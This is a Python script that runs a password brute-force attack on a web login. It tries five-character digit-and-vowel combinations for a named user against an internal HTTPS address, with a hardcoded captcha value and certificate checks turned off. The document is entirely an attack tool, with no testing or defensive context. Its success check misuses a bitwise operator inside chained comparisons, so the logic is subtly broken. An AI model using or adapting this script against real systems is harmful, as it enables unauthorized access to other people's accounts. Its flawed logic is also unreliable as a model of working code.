#!/usr/bin/python

import requests
import string
import itertools
import sys

from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

r = requests.Session()
charset = string.digits + "a" + "e" + "i" + "o" + "u"
pwds = list(itertools.permutations(charset,5))
pwds_rep = list(itertools.product(charset,repeat=5))
pwds = list(set(pwds_rep).difference(pwds))
#print (''.join(pwds[1]))
i = int(sys.argv[1])
cond = True
while cond:
    pwd = ''.join(pwds[i])
    i = i+1
    cred = {"username":"dgangwar", "password":pwd, "captcha":"cdsnkj"}
    login = r.post("https://172.27.30.144",cred,verify=False)
    print(i,login.status_code,pwd)
    if login.status_code != 401 | login.status_code != 503:
        print("password is: "+pwd)
        cond = False

